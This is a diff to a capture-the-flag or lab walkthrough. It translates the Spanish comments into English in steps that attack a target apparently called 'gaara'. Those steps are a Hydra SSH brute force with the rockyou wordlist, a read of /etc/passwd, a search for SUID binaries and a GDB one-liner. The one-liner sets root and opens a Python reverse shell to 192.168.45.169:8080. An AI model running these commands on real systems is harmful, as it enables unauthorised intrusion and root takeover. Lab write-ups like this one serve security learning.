@@ -29,12 +29,12 @@ nikto -h http://$TARGET
 ```
 ---
 
-## No nos ha dado ningun resultado als tecnicas anteriores pasamos a la fuerza bruta 
+## The earlier web checks did not return a useful path, so the next move is brute force
 
-## Tenemos unu usuario potencial gaara vamos a atacar ssh con fuerza bruta usando hydra
+## We have a potential username, `gaara`, and can attack SSH with Hydra
 
 ```bash
-### Ataque de Diccionario con medusa
+# Dictionary attack against SSH
 hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V
 ```
 **Output**
@@ -51,7 +51,7 @@ iloveyou2
 # Grab the user flag
 cat local.txt
 cat /etc/passwd
-# Buscamos suid 
+# Search for SUID binaries
 find / -perm -4000 -type f 2>/dev/null | xargs ls -la | grep -v snap
 ```
 **Output**
@@ -69,14 +69,13 @@ https://gtfobins.org/gtfobins/gdb/
 ```bash
 which python
 nc -lvnp 8080
-# Ejecutamos gbd -nx sin cargar archivos de config -p adjuntarse al proceso con pid 1 -ex "python" ejecuta codigo python dentro de GDB
-# os.setuid(0) fuerza al proceso a convertirse en root real
+# Run gdb with -nx to avoid loading config files, attach to PID 1 with -p,
+# and use -ex "python ..." to execute Python code inside GDB.
+# os.setuid(0) forces the process to become real root before spawning the shell.
 /usr/bin/gdb -nx -p 1 -ex 'python import os; os.setuid(0); import socket,pty;s=socket.socket();s.connect(("192.168.45.169",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' -ex quit
 ```
 
 ---
-silen
-
 ## Related Notes
 
 - [nmap](../../../tools/recon/nmap.md)
